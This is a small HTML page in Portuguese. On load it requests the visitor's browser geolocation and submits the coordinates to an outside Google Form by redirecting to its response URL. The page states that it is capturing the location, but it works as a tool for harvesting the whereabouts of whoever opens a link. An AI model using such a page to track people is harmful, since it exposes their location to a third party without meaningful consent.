<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captura de Coordenadas</title>
    <script>
        function capturarCoordenadas() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const coordenadas = `${latitude},${longitude}`;
                        const formUrl = "https://docs.google.com/forms/d/e/11ldD0eLL8wsmmGT228y6Myp6LF5mc3i-iyQej0ldO_M/formResponse";
                        const entryId = "entry.1396622586";
                        const redirectUrl = `${formUrl}?${entryId}=${coordenadas}`;
                        window.location.href = redirectUrl;
                    },
                    (error) => {
                        alert("Erro ao acessar a localização: " + error.message);
                    }
                );
            } else {
                alert("Geolocalização não é suportada neste dispositivo.");
            }
        }
    </script>
</head>
<body onload="capturarCoordenadas()">
    <h2>Capturando a sua localização...</h2>
</body>
</html>
